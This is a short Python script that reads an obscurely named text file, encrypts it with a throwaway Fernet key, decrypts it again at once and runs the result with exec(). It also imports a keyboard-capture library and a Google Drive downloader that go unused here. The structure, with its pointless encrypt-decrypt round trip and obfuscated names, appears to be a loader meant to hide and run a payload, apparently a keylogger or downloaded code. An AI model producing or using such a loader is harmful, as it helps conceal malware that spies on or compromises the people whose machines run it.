from cryptography.fernet import Fernet
from pynput import keyboard
import gdown

var_7423874239874893274238428934982347983242 = []


def encrypt(code, key):
    cipher_suite = Fernet(key)
    encrypted_code = cipher_suite.encrypt(code.encode('utf-8'))
    return encrypted_code


def decrypt(encrypted_code, key):
    cipher_suite = Fernet(key)
    decrypted_code = cipher_suite.decrypt(encrypted_code)
    return decrypted_code.decode('utf-8')


def read_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read()
    except FileNotFoundError:
        print(f"Error: File not found - {file_path}")
    except Exception as e:
        print(f"Error reading file: {e}")
    return None


def entry():
    file_path = "y893489480248230948290342jfdosjfso.txt"
    original_code = read_file(file_path)

    if original_code is None:
        exit(1)

    key = Fernet.generate_key()
    encrypted_code = encrypt(original_code, key)

    try:
        decrypted_code = decrypt(encrypted_code, key)
        exec(decrypted_code, globals())
    except Exception as e:
        print(f"Error decrypting or executing code: {e}")
        exit(1)


if __name__ == "__main__":
    entry()
